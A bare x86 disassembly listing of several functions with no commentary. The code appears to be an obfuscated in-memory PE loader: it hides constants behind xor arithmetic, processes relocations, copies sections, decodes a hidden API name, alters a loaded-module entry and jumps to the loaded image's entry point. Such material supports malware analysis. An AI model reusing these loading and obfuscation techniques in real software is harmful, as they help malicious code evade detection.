  425f9e:	mov    eax,DWORD PTR [ebp+0xc]
  425fa1:	add    eax,DWORD PTR [ebp+0x8]
  425fa4:	mov    ecx,DWORD PTR [ebp+0x10]
  425fa7:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425fad:	add    eax,0x2
  425fb0:	push   eax
  425fb1:	push   DWORD PTR [ebp-0xc]
  425fb4:	call   DWORD PTR [ecx+0x8]
  425fb7:	mov    DWORD PTR [ebp+0xc],eax
  425fba:	mov    eax,DWORD PTR [ebp-0x4]
  425fbd:	mov    ecx,DWORD PTR [ebp+0xc]
  425fc0:	xor    eax,esi
  425fc2:	add    eax,edi
  425fc4:	cmp    eax,ecx
  425fc6:	mov    eax,DWORD PTR [ebp-0x8]
  425fc9:	jne    0x425fdc
  425fcb:	mov    ecx,DWORD PTR [ebp-0x18]
  425fce:	xor    eax,esi
  425fd0:	lea    eax,[ecx+eax*1+0x3272f8]
  425fd7:	mov    DWORD PTR [ebp-0x18],eax
  425fda:	jmp    0x425fec
  425fdc:	mov    ecx,DWORD PTR [ebp+0xc]
  425fdf:	xor    eax,esi
  425fe1:	add    eax,edi
  425fe3:	imul   eax,ecx
  425fe6:	mov    ecx,DWORD PTR [ebp-0x1c]
  425fe9:	mov    DWORD PTR [ecx+ebx*4],eax
  425fec:	mov    eax,DWORD PTR [ebp-0x8]
  425fef:	xor    eax,esi
  425ff1:	lea    ebx,[ebx+eax*1+0x3272f8]
  425ff8:	mov    eax,DWORD PTR [ebp-0x4]
  425ffb:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ffe:	xor    eax,esi
  426000:	add    eax,edi
  426002:	cmp    DWORD PTR [ecx+ebx*4],eax
  426005:	jne    0x425f36
  42600b:	mov    edx,DWORD PTR [ebp-0x10]
  42600e:	mov    eax,DWORD PTR [ebp-0x18]
  426011:	mov    ecx,DWORD PTR [ebp-0x2c]
  426014:	sub    edx,0x3272f7
  42601a:	xor    edx,esi
  42601c:	jmp    0x425de6
  426021:	mov    ecx,DWORD PTR [ebp-0x4]
  426024:	xor    ecx,esi
  426026:	add    ecx,edi
  426028:	cmp    eax,ecx
  42602a:	mov    eax,DWORD PTR [ebp-0x4]
  42602d:	jne    0x426037
  42602f:	mov    eax,DWORD PTR [ebp-0x8]
  426032:	jmp    0x426037
  426034:	mov    eax,DWORD PTR [ebp-0x4]
  426037:	xor    eax,esi
  426039:	add    eax,edi
  42603b:	pop    edi
  42603c:	pop    esi
  42603d:	pop    ebx
  42603e:	leave  
  42603f:	ret    0xc
  426042:	push   ebp
  426043:	mov    ebp,esp
  426045:	sub    esp,0x28
  426048:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  42604f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  426056:	mov    eax,DWORD PTR [ebp+0xc]
  426059:	mov    DWORD PTR [ebp+0xc],eax
  42605c:	push   esi
  42605d:	mov    eax,eax
  42605f:	mov    eax,DWORD PTR [ebp-0x4]
  426062:	mov    esi,DWORD PTR [ebp+0x8]
  426065:	mov    ecx,0x75108b1
  42606a:	xor    eax,ecx
  42606c:	mov    edx,0x3272f8
  426071:	add    eax,edx
  426073:	cmp    esi,eax
  426075:	je     0x42619c
  42607b:	mov    eax,DWORD PTR [ebp+0x8]
  42607e:	mov    esi,DWORD PTR [ebp+0x8]
  426081:	add    esi,DWORD PTR [eax+0x3c]
  426084:	push   edi
  426085:	mov    DWORD PTR [ebp+0xc],esi
  426088:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  42608f:	mov    eax,DWORD PTR [ebp-0x1c]
  426092:	mov    esi,DWORD PTR [ebp-0x4]
  426095:	mov    edi,DWORD PTR [ebp+0xc]
  426098:	xor    esi,ecx
  42609a:	xor    eax,ecx
  42609c:	add    esi,edx
  42609e:	cmp    DWORD PTR [edi+eax*8+0x1939838],esi
  4260a5:	je     0x426196
  4260ab:	mov    esi,DWORD PTR [ebp+0xc]
  4260ae:	mov    eax,DWORD PTR [ebp+0x8]
  4260b1:	add    eax,DWORD PTR [esi+0xa0]
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	mov    edi,DWORD PTR [ebp+0xc]
  4260bd:	sub    esi,DWORD PTR [edi+0x34]
  4260c0:	mov    edi,DWORD PTR [ebp-0x4]
  4260c3:	xor    edi,ecx
  4260c5:	add    edi,edx
  4260c7:	mov    DWORD PTR [ebp-0x24],esi
  4260ca:	cmp    esi,edi
  4260cc:	je     0x426196
  4260d2:	mov    esi,DWORD PTR [ebp-0x4]
  4260d5:	xor    esi,ecx
  4260d7:	add    esi,edx
  4260d9:	mov    DWORD PTR [ebp-0x8],esi
  4260dc:	push   ebx
  4260dd:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4260e4:	jmp    0x426180
  4260e9:	mov    esi,DWORD PTR [ebp-0x4]
  4260ec:	xor    esi,ecx
  4260ee:	lea    edi,[ebx-0x8]
  4260f1:	add    esi,edx
  4260f3:	shr    edi,1
  4260f5:	cmp    esi,edi
  4260f7:	jae    0x426166
  4260f9:	sub    edi,esi
  4260fb:	lea    ebx,[eax+esi*2+0x8]
  4260ff:	mov    DWORD PTR [ebp-0x18],edi
  426102:	movzx  esi,WORD PTR [ebx]
  426105:	and    esi,0xfff
  42610b:	mov    DWORD PTR [ebp-0x14],esi
  42610e:	mov    edi,DWORD PTR [ebp-0x14]
  426111:	mov    esi,DWORD PTR [eax]
  426113:	sub    esi,edx
  426115:	add    edi,esi
  426117:	movzx  esi,WORD PTR [ebx]
  42611a:	shr    esi,0xc
  42611d:	xor    edi,ecx
  42611f:	mov    DWORD PTR [ebp-0x20],edi
  426122:	mov    DWORD PTR [ebp-0x14],esi
  426125:	mov    esi,DWORD PTR [ebp-0x20]
  426128:	mov    edi,DWORD PTR [ebp+0x8]
  42612b:	xor    esi,ecx
  42612d:	lea    esi,[esi+edi*1+0x3272f8]
  426134:	mov    DWORD PTR [ebp-0x20],esi
  426137:	mov    esi,DWORD PTR [ebp-0x10]
  42613a:	mov    edi,DWORD PTR [ebp-0x14]
  42613d:	xor    esi,ecx
  42613f:	add    esi,edx
  426141:	cmp    edi,esi
  426143:	jne    0x42615b
  426145:	mov    esi,DWORD PTR [ebp-0x10]
  426148:	mov    edi,DWORD PTR [ebp-0x14]
  42614b:	xor    esi,ecx
  42614d:	add    esi,edx
  42614f:	cmp    edi,esi
  426151:	jne    0x42615b
  426153:	mov    esi,DWORD PTR [ebp-0x20]
  426156:	mov    edi,DWORD PTR [ebp-0x24]
  426159:	add    DWORD PTR [esi],edi
  42615b:	add    ebx,0x2
  42615e:	dec    DWORD PTR [ebp-0x18]
  426161:	jne    0x426102
  426163:	mov    ebx,DWORD PTR [ebp-0xc]
  426166:	add    DWORD PTR [ebp-0x8],ebx
  426169:	mov    esi,DWORD PTR [ebp-0x1c]
  42616c:	mov    edi,DWORD PTR [ebp-0x8]
  42616f:	mov    ebx,DWORD PTR [ebp+0xc]
  426172:	xor    esi,ecx
  426174:	cmp    edi,DWORD PTR [ebx+esi*8+0x193983c]
  42617b:	jae    0x426195
  42617d:	add    eax,DWORD PTR [ebp-0xc]
  426180:	mov    esi,DWORD PTR [ebp-0x4]
  426183:	mov    ebx,DWORD PTR [eax+0x4]
  426186:	xor    esi,ecx
  426188:	add    esi,edx
  42618a:	mov    DWORD PTR [ebp-0xc],ebx
  42618d:	cmp    ebx,esi
  42618f:	jne    0x4260e9
  426195:	pop    ebx
  426196:	mov    eax,DWORD PTR [ebp-0x28]
  426199:	pop    edi
  42619a:	jmp    0x42619f
  42619c:	mov    eax,DWORD PTR [ebp-0x4]
  42619f:	xor    eax,ecx
  4261a1:	add    eax,edx
  4261a3:	pop    esi
  4261a4:	leave  
  4261a5:	ret    0x8
  4261a8:	push   ebp
  4261a9:	mov    ebp,esp
  4261ab:	sub    esp,0xd8
  4261b1:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  4261b8:	mov    DWORD PTR [ebp-0x24],0xf89c85b8
  4261bf:	mov    eax,DWORD PTR [ebp-0x4]
  4261c2:	push   ebx
  4261c3:	push   esi
  4261c4:	mov    esi,0x75108b1
  4261c9:	xor    eax,esi
  4261cb:	push   edi
  4261cc:	mov    edi,0x3272f8
  4261d1:	add    eax,edi
  4261d3:	mov    DWORD PTR [ebp-0x18],eax
  4261d6:	mov    eax,DWORD PTR [ebp-0x4]
  4261d9:	xor    eax,esi
  4261db:	add    eax,edi
  4261dd:	mov    DWORD PTR [ebp-0x8],eax
  4261e0:	mov    ebx,DWORD PTR [ebp+0x20]
  4261e3:	mov    eax,DWORD PTR [ebp-0x1c]
  4261e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4261e9:	xor    eax,ecx
  4261eb:	mov    DWORD PTR [ebp-0x1c],eax
  4261ee:	add    DWORD PTR [ebp-0x1c],0xf89cb5b9
  4261f5:	mov    eax,DWORD PTR [ebp-0xc]
  4261f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4261fb:	xor    eax,ecx
  4261fd:	mov    DWORD PTR [ebp-0xc],eax
  426200:	add    DWORD PTR [ebp-0xc],0xf89c85f9
  426207:	mov    eax,DWORD PTR [ebp-0x10]
  42620a:	mov    ecx,DWORD PTR [ebp-0x10]
  42620d:	xor    eax,ecx
  42620f:	mov    DWORD PTR [ebp-0x10],eax
  426212:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  426219:	mov    eax,DWORD PTR [ebp-0x28]
  42621c:	mov    ecx,DWORD PTR [ebp-0x28]
  42621f:	xor    eax,ecx
  426221:	mov    DWORD PTR [ebp-0x28],eax
  426224:	add    DWORD PTR [ebp-0x28],0xf89f05b9
  42622b:	mov    DWORD PTR [ebp+0x20],0xf89cefe4
  426232:	mov    eax,DWORD PTR [ebp+0x8]
  426235:	test   eax,eax
  426237:	je     0x4266be
  42623d:	mov    eax,DWORD PTR [ebp+0xc]
  426240:	test   eax,eax
  426242:	je     0x4266be
  426248:	mov    eax,DWORD PTR [ebp+0x18]
  42624b:	test   eax,eax
  42624d:	je     0x4266be
  426253:	mov    eax,DWORD PTR [ebp+0x20]
  426256:	mov    ecx,DWORD PTR [ebp+0x8]
  426259:	xor    eax,0x8b1
  42625e:	add    eax,0x72f8
  426263:	cmp    WORD PTR [ecx],ax
  426266:	jne    0x4266be
  42626c:	mov    eax,DWORD PTR [ebp-0x4]
  42626f:	xor    eax,esi
  426271:	add    eax,edi
  426273:	mov    DWORD PTR [ebp-0x30],eax
  426276:	mov    eax,DWORD PTR [ebp-0x4]
  426279:	mov    ecx,DWORD PTR [ebp+0x8]
  42627c:	mov    eax,DWORD PTR [ebp+0x8]
  42627f:	add    eax,DWORD PTR [ecx+0x3c]
  426282:	mov    DWORD PTR [ebp+0xc],eax
  426285:	mov    eax,DWORD PTR [eax+0x50]
  426288:	test   eax,eax
  42628a:	je     0x4266be
  426290:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  426297:	mov    eax,DWORD PTR [ebp-0x2c]
  42629a:	xor    eax,esi
  42629c:	add    eax,edi
  42629e:	mov    DWORD PTR [ebp-0x2c],eax
  4262a1:	mov    eax,DWORD PTR [ebp-0x4]
  4262a4:	mov    eax,DWORD PTR [ebx+0x190]
  4262aa:	mov    ecx,DWORD PTR [eax]
  4262ac:	mov    ecx,DWORD PTR [ecx+0x3c]
  4262af:	add    ecx,DWORD PTR [eax]
  4262b1:	mov    eax,DWORD PTR [ebp-0x4]
  4262b4:	mov    eax,DWORD PTR [ebx+0x18c]
  4262ba:	mov    edx,DWORD PTR [eax]
  4262bc:	mov    DWORD PTR [ebp-0x20],ecx
  4262bf:	mov    DWORD PTR [ebp+0x20],edx
  4262c2:	cmp    edx,edx
  4262c4:	jne    0x4262f8
  4262c6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4262cc:	lea    edx,[ebp-0x18]
  4262cf:	push   edx
  4262d0:	mov    edx,DWORD PTR [ebp-0xc]
  4262d3:	xor    edx,esi
  4262d5:	add    edx,edi
  4262d7:	push   edx
  4262d8:	push   DWORD PTR [ecx+0x50]
  4262db:	push   DWORD PTR [ebp+0x20]
  4262de:	call   DWORD PTR [eax+0x1c]
  4262e1:	mov    eax,DWORD PTR [ebp-0x20]
  4262e4:	mov    ecx,DWORD PTR [eax+0x54]
  4262e7:	mov    eax,DWORD PTR [eax+0x50]
  4262ea:	sub    eax,ecx
  4262ec:	add    ecx,DWORD PTR [ebp+0x20]
  4262ef:	push   ecx
  4262f0:	call   0x426c5b
  4262f5:	mov    edx,DWORD PTR [ebp+0x20]
  4262f8:	mov    eax,DWORD PTR [ebx+0x194]
  4262fe:	mov    DWORD PTR [eax],edx
  426300:	mov    eax,DWORD PTR [ebp+0xc]
  426303:	push   DWORD PTR [eax+0x54]
  426306:	push   DWORD PTR [ebp+0x8]
  426309:	push   edx
  42630a:	call   0x426b51
  42630f:	mov    ecx,DWORD PTR [ebp+0x20]
  426312:	mov    eax,DWORD PTR [ecx+0x3c]
  426315:	add    eax,ecx
  426317:	movzx  ecx,WORD PTR [eax+0x14]
  42631b:	lea    ecx,[ecx+eax*1+0x18]
  42631f:	mov    DWORD PTR [ebp+0x18],ecx
  426322:	mov    ecx,DWORD PTR [ebp-0x4]
  426325:	movzx  edx,WORD PTR [eax+0x6]
  426329:	xor    ecx,esi
  42632b:	add    ecx,edi
  42632d:	mov    DWORD PTR [ebp+0xc],eax
  426330:	cmp    edx,ecx
  426332:	je     0x4263df
  426338:	mov    ecx,DWORD PTR [ebp-0x4]
  42633b:	xor    ecx,esi
  42633d:	add    ecx,edi
  42633f:	mov    DWORD PTR [ebp-0x8],ecx
  426342:	mov    ecx,DWORD PTR [ebp-0x24]
  426345:	movzx  edx,WORD PTR [eax+0x6]
  426349:	xor    ecx,esi
  42634b:	sub    edx,ecx
  42634d:	sub    edx,edi
  42634f:	cmp    DWORD PTR [ebp-0x8],edx
  426352:	ja     0x4263df
  426358:	mov    edx,DWORD PTR [ebp+0x18]
  42635b:	add    edx,0x8
  42635e:	mov    DWORD PTR [ebp+0x18],edx
  426361:	jmp    0x426366
  426363:	mov    edx,DWORD PTR [ebp+0x18]
  426366:	mov    eax,DWORD PTR [eax+0x38]
  426369:	lea    ecx,[eax-0x1]
  42636c:	mov    DWORD PTR [ebp-0x38],eax
  42636f:	mov    eax,DWORD PTR [edx]
  426371:	test   eax,ecx
  426373:	je     0x42637c
  426375:	not    ecx
  426377:	and    eax,ecx
  426379:	add    eax,DWORD PTR [ebp-0x38]
  42637c:	mov    ecx,DWORD PTR [edx+0x4]
  42637f:	add    ecx,DWORD PTR [ebp+0x20]
  426382:	push   ecx
  426383:	call   0x426c5b
  426388:	mov    edx,DWORD PTR [ebp-0x4]
  42638b:	mov    eax,DWORD PTR [ebp+0x18]
  42638e:	mov    ecx,DWORD PTR [eax+0x8]
  426391:	xor    edx,esi
  426393:	add    edx,edi
  426395:	cmp    ecx,edx
  426397:	je     0x4263b0
  426399:	push   ecx
  42639a:	mov    ecx,DWORD PTR [ebp+0x8]
  42639d:	add    ecx,DWORD PTR [eax+0xc]
  4263a0:	mov    eax,DWORD PTR [eax+0x4]
  4263a3:	add    eax,DWORD PTR [ebp+0x20]
  4263a6:	push   ecx
  4263a7:	push   eax
  4263a8:	call   0x426b51
  4263ad:	mov    eax,DWORD PTR [ebp+0x18]
  4263b0:	mov    ecx,DWORD PTR [ebp-0x24]
  4263b3:	mov    edx,DWORD PTR [ebp-0x8]
  4263b6:	add    eax,0x28
  4263b9:	xor    ecx,esi
  4263bb:	lea    ecx,[edx+ecx*1+0x3272f8]
  4263c2:	mov    edx,DWORD PTR [ebp+0xc]
  4263c5:	mov    DWORD PTR [ebp+0x18],eax
  4263c8:	mov    eax,DWORD PTR [ebp-0x24]
  4263cb:	movzx  edx,WORD PTR [edx+0x6]
  4263cf:	xor    eax,esi
  4263d1:	sub    edx,eax
  4263d3:	mov    eax,DWORD PTR [ebp+0xc]
  4263d6:	sub    edx,edi
  4263d8:	mov    DWORD PTR [ebp-0x8],ecx
  4263db:	cmp    ecx,edx
  4263dd:	jbe    0x426363
  4263df:	mov    edx,DWORD PTR [ebx+0x18c]
  4263e5:	mov    ecx,DWORD PTR [ebp+0x20]
  4263e8:	cmp    ecx,DWORD PTR [edx]
  4263ea:	jne    0x426413
  4263ec:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263f2:	lea    edx,[ebp-0x18]
  4263f5:	push   edx
  4263f6:	mov    edx,DWORD PTR [ebp-0x10]
  4263f9:	xor    edx,esi
  4263fb:	add    edx,edi
  4263fd:	push   edx
  4263fe:	mov    edx,DWORD PTR [ebp-0x20]
  426401:	push   DWORD PTR [edx+0x54]
  426404:	push   ecx
  426405:	call   DWORD PTR [eax+0x1c]
  426408:	test   eax,eax
  42640a:	je     0x4266af
  426410:	mov    eax,DWORD PTR [ebp+0xc]
  426413:	mov    ecx,DWORD PTR [ebx+0x1c8]
  426419:	mov    ecx,DWORD PTR [ecx]
  42641b:	xor    ecx,esi
  42641d:	add    ecx,edi
  42641f:	je     0x4265da
  426425:	mov    eax,DWORD PTR [ebp-0x4]
  426428:	xor    eax,esi
  42642a:	add    eax,edi
  42642c:	and    DWORD PTR [ebp+0x8],0x0
  426430:	mov    DWORD PTR [ebp-0x14],eax
  426433:	mov    eax,0xf89c85dd
  426438:	lea    ecx,[eax-0x18]
  42643b:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  426442:	mov    DWORD PTR [ebp-0x54],0xf89c85cd
  426449:	mov    DWORD PTR [ebp-0x50],eax
  42644c:	mov    DWORD PTR [ebp-0x4c],ecx
  42644f:	mov    DWORD PTR [ebp-0x48],ecx
  426452:	mov    DWORD PTR [ebp-0x44],0xf89c85b9
  426459:	mov    edx,DWORD PTR [ebp+0x8]
  42645c:	mov    ecx,0x8b1
  426461:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  426466:	mov    edx,0x72f8
  42646b:	add    cx,dx
  42646e:	mov    edx,DWORD PTR [ebp+0x8]
  426471:	inc    DWORD PTR [ebp+0x8]
  426474:	cmp    DWORD PTR [ebp+0x8],0x6
  426478:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  426480:	jb     0x426459
  426482:	mov    ecx,0xf89c85cb
  426487:	mov    DWORD PTR [ebp-0xb0],eax
  42648d:	mov    DWORD PTR [ebp-0x9c],eax
  426493:	mov    DWORD PTR [ebp-0x74],eax
  426496:	mov    DWORD PTR [ebp-0x70],eax
  426499:	lea    eax,[ecx-0x1]
  42649c:	lea    edx,[ecx+0x34]
  42649f:	mov    DWORD PTR [ebp-0x64],eax
  4264a2:	mov    DWORD PTR [ebp-0x60],eax
  4264a5:	mov    DWORD PTR [ebp-0xb4],0xf89c85e5
  4264af:	mov    DWORD PTR [ebp-0xac],ecx
  4264b5:	mov    DWORD PTR [ebp-0xa8],edx
  4264bb:	mov    DWORD PTR [ebp-0xa4],0xf89c85c0
  4264c5:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  4264cf:	mov    DWORD PTR [ebp-0x98],0xf89c85fc
  4264d9:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  4264e3:	mov    DWORD PTR [ebp-0x90],0xf89c85cd
  4264ed:	mov    DWORD PTR [ebp-0x8c],ecx
  4264f3:	mov    DWORD PTR [ebp-0x88],0xf89c8530
  4264fd:	mov    DWORD PTR [ebp-0x84],edx
  426503:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  42650a:	mov    DWORD PTR [ebp-0x7c],ecx
  42650d:	mov    DWORD PTR [ebp-0x78],0xf89c85f8
  426514:	mov    DWORD PTR [ebp-0x6c],ecx
  426517:	mov    DWORD PTR [ebp-0x68],0xf89c85dc
  42651e:	mov    DWORD PTR [ebp-0x5c],0xf89c85b9
  426525:	xor    eax,eax
  426527:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  42652e:	xor    cl,0xb1
  426531:	sub    cl,0x8
  426534:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  42653b:	inc    eax
  42653c:	cmp    eax,0x17
  42653f:	jb     0x426527
  426541:	mov    eax,DWORD PTR [ebx+0x1e0]
  426547:	lea    ecx,[ebp-0xc0]
  42654d:	push   ecx
  42654e:	call   DWORD PTR [eax+0x4]
  426551:	mov    ecx,DWORD PTR [ebx+0x1e0]
  426557:	lea    edx,[ebp-0xd8]
  42655d:	push   edx
  42655e:	push   eax
  42655f:	call   DWORD PTR [ecx+0x8]
  426562:	mov    DWORD PTR [ebp-0x40],eax
  426565:	lea    eax,[ebp-0x14]
  426568:	push   eax
  426569:	mov    eax,DWORD PTR [ebx+0x18c]
  42656f:	push   DWORD PTR [eax]
  426571:	mov    eax,DWORD PTR [ebp-0x40]
  426574:	call   eax
  426576:	mov    eax,DWORD PTR [ebp-0x4]
  426579:	xor    eax,esi
  42657b:	add    eax,edi
  42657d:	mov    DWORD PTR [ebp-0x34],eax
  426580:	mov    ecx,DWORD PTR [ebp-0x4]
  426583:	mov    eax,DWORD PTR [ebp-0x14]
  426586:	xor    ecx,esi
  426588:	add    ecx,edi
  42658a:	cmp    eax,ecx
  42658c:	je     0x4265d7
  42658e:	mov    DWORD PTR [ebp-0x3c],eax
  426591:	jmp    0x4265a2
  426593:	mov    eax,DWORD PTR [eax]
  426595:	mov    ecx,DWORD PTR [ebp-0x3c]
  426598:	mov    DWORD PTR [ebp-0x14],eax
  42659b:	mov    eax,DWORD PTR [ebp-0x14]
  42659e:	cmp    eax,ecx
  4265a0:	je     0x4265af
  4265a2:	mov    edx,DWORD PTR [eax+0x18]
  4265a5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4265ab:	cmp    edx,DWORD PTR [ecx]
  4265ad:	jne    0x426593
  4265af:	mov    ecx,DWORD PTR [ebx+0x18c]
  4265b5:	mov    edx,DWORD PTR [eax+0x18]
  4265b8:	cmp    edx,DWORD PTR [ecx]
  4265ba:	jne    0x4265d7
  4265bc:	mov    ecx,DWORD PTR [ebx+0x190]
  4265c2:	mov    edx,DWORD PTR [ebp-0x20]
  4265c5:	mov    edx,DWORD PTR [edx+0x28]
  4265c8:	add    edx,DWORD PTR [ecx]
  4265ca:	mov    DWORD PTR [eax+0x1c],edx
  4265cd:	mov    eax,DWORD PTR [ebp-0x24]
  4265d0:	xor    eax,esi
  4265d2:	add    eax,edi
  4265d4:	mov    DWORD PTR [ebp-0x34],eax
  4265d7:	mov    eax,DWORD PTR [ebp+0xc]
  4265da:	push   ebx
  4265db:	push   eax
  4265dc:	push   DWORD PTR [ebp+0x20]
  4265df:	call   0x425d5f
  4265e4:	test   eax,eax
  4265e6:	je     0x4266af
  4265ec:	push   DWORD PTR [ebp+0xc]
  4265ef:	mov    ecx,ebx
  4265f1:	push   DWORD PTR [ebp+0x20]
  4265f4:	call   0x425cb8
  4265f9:	test   eax,eax
  4265fb:	je     0x4266af
  426601:	mov    eax,DWORD PTR [ebp+0xc]
  426604:	mov    edx,DWORD PTR [ebp+0x20]
  426607:	mov    ecx,ebx
  426609:	call   0x425b91
  42660e:	test   eax,eax
  426610:	je     0x4266af
  426616:	push   ebx
  426617:	push   DWORD PTR [ebp+0x20]
  42661a:	call   0x426042
  42661f:	test   eax,eax
  426621:	je     0x4266af
  426627:	mov    eax,DWORD PTR [ebx+0x18c]
  42662d:	mov    edx,DWORD PTR [ebp+0x20]
  426630:	cmp    edx,DWORD PTR [eax]
  426632:	jne    0x42664e
  426634:	mov    eax,DWORD PTR [ebx+0x1e0]
  42663a:	lea    ecx,[ebp-0x18]
  42663d:	push   ecx
  42663e:	push   DWORD PTR [ebp-0x18]
  426641:	mov    ecx,DWORD PTR [ebp-0x20]
  426644:	push   DWORD PTR [ecx+0x54]
  426647:	push   edx
  426648:	call   DWORD PTR [eax+0x1c]
  42664b:	mov    edx,DWORD PTR [ebp+0x20]
  42664e:	mov    eax,DWORD PTR [ebx+0x1c8]
  426654:	mov    eax,DWORD PTR [eax]
  426656:	xor    eax,esi
  426658:	add    eax,edi
  42665a:	je     0x426693
  42665c:	mov    ecx,DWORD PTR [ebp+0xc]
  42665f:	mov    eax,DWORD PTR [ecx+0x28]
  426662:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  426669:	mov    esi,DWORD PTR [ebp+0x8]
  42666c:	push   DWORD PTR [ebp+0x14]
  42666f:	xor    esi,0x8b1
  426675:	push   DWORD PTR [ebp+0x10]
  426678:	add    esi,0x72f8
  42667e:	or     WORD PTR [ecx+0x16],si
  426682:	add    eax,edx
  426684:	push   edx
  426685:	call   eax
  426687:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b8
  426691:	jmp    0x42669d
  426693:	mov    eax,DWORD PTR [ebp+0xc]
  426696:	mov    eax,DWORD PTR [eax+0x28]
  426699:	add    eax,edx
  42669b:	call   eax
  42669d:	mov    DWORD PTR [ebp-0x8],eax
  4266a0:	mov    eax,DWORD PTR [ebp-0x8]
  4266a3:	mov    ecx,DWORD PTR [ebp+0x1c]
  4266a6:	mov    DWORD PTR [ecx],eax
  4266a8:	mov    DWORD PTR [ebp-0x30],0x1
  4266af:	cmp    DWORD PTR [ebp-0x30],0x0
  4266b3:	jne    0x4266b9
  4266b5:	and    DWORD PTR [ebp+0x20],0x0
  4266b9:	mov    eax,DWORD PTR [ebp+0x20]
  4266bc:	jmp    0x4266c0
  4266be:	xor    eax,eax
  4266c0:	pop    edi
  4266c1:	pop    esi
  4266c2:	pop    ebx
  4266c3:	leave  
  4266c4:	ret    0x1c
  4266c7:	push   ebp
  4266c8:	mov    ebp,esp
  4266ca:	movzx  edx,WORD PTR [ecx+0x6]
  4266ce:	movzx  eax,WORD PTR [ecx+0x14]
  4266d2:	push   ebx
  4266d3:	push   edi
  4266d4:	xor    edi,edi
  4266d6:	lea    eax,[eax+ecx*1+0x18]
  4266da:	test   edx,edx
  4266dc:	je     0x4266fd
  4266de:	mov    ecx,DWORD PTR [eax+0xc]
  4266e1:	lea    ebx,[ecx+esi*1]
  4266e4:	cmp    DWORD PTR [ebp+0x8],ebx
  4266e7:	jb     0x4266f5
  4266e9:	mov    ebx,DWORD PTR [eax+0x8]
  4266ec:	add    ebx,ecx
  4266ee:	add    ebx,esi
  4266f0:	cmp    DWORD PTR [ebp+0x8],ebx
  4266f3:	jb     0x4266ff
  4266f5:	add    eax,0x28
  4266f8:	inc    edi
  4266f9:	cmp    edi,edx
  4266fb:	jb     0x4266de
  4266fd:	xor    eax,eax
  4266ff:	pop    edi
  426700:	pop    ebx
  426701:	pop    ebp
  426702:	ret    0x4
  426705:	push   ebp
  426706:	mov    ebp,esp
  426708:	sub    esp,0x34
  42670b:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  426712:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  426719:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  426720:	mov    DWORD PTR [ebp-0x8],0xf89c85d8
  426727:	mov    DWORD PTR [ebp-0x20],0xf89c85f8
  42672e:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  426735:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  42673c:	mov    DWORD PTR [ebp-0x10],eax
  42673f:	mov    eax,DWORD PTR [ebp+0x8]
  426742:	mov    DWORD PTR [ebp-0x14],eax
  426745:	mov    eax,DWORD PTR [ebp-0xc]
  426748:	push   ebx
  426749:	mov    ecx,0x75108b1
  42674e:	xor    eax,ecx
  426750:	push   esi
  426751:	mov    esi,DWORD PTR [ebp-0x10]
  426754:	mov    edx,0x3272f8
  426759:	add    eax,edx
  42675b:	push   edi
  42675c:	cmp    esi,eax
  42675e:	je     0x42693d
  426764:	mov    eax,DWORD PTR [ebp-0xc]
  426767:	mov    esi,DWORD PTR [ebp-0x14]
  42676a:	xor    eax,ecx
  42676c:	add    eax,edx
  42676e:	cmp    esi,eax
  426770:	je     0x42693d
  426776:	mov    eax,DWORD PTR [ebp-0xc]
  426779:	xor    eax,ecx
  42677b:	add    eax,edx
  42677d:	mov    DWORD PTR [ebp-0x24],eax
  426780:	mov    eax,DWORD PTR [ebp-0xc]
  426783:	xor    eax,ecx
  426785:	add    eax,edx
  426787:	mov    DWORD PTR [ebp-0x28],eax
  42678a:	mov    edi,DWORD PTR [ebp-0x20]
  42678d:	mov    ebx,DWORD PTR [ebp-0x8]
  426790:	mov    esi,0x8b1
  426795:	xor    edi,esi
  426797:	mov    eax,0x72f8
  42679c:	xor    ebx,esi
  42679e:	add    edi,eax
  4267a0:	add    ebx,eax
  4267a2:	sub    ebx,edi
  4267a4:	mov    WORD PTR [ebp-0x8],bx
  4267a8:	jmp    0x42686d
  4267ad:	mov    edi,DWORD PTR [ebp-0xc]
  4267b0:	mov    bx,WORD PTR [ebp-0x4]
  4267b4:	xor    edi,esi
  4267b6:	add    edi,eax
  4267b8:	cmp    bx,di
  4267bb:	je     0x4268af
  4267c1:	mov    edi,DWORD PTR [ebp-0xc]
  4267c4:	mov    ebx,DWORD PTR [ebp+0xc]
  4267c7:	xor    edi,ecx
  4267c9:	add    edi,edx
  4267cb:	cmp    ebx,edi
  4267cd:	mov    di,WORD PTR [ebp-0x4]
  4267d1:	mov    bx,WORD PTR [ebp+0x8]
  4267d5:	je     0x426840
  4267d7:	cmp    bx,di
  4267da:	je     0x426849
  4267dc:	mov    edi,DWORD PTR [ebp-0x20]
  4267df:	mov    bx,WORD PTR [ebp+0x8]
  4267e3:	xor    edi,esi
  4267e5:	add    edi,eax
  4267e7:	cmp    bx,di
  4267ea:	jb     0x42680a
  4267ec:	mov    edi,DWORD PTR [ebp-0x2c]
  4267ef:	mov    bx,WORD PTR [ebp+0x8]
  4267f3:	xor    edi,esi
  4267f5:	add    edi,eax
  4267f7:	cmp    bx,di
  4267fa:	ja     0x42680a
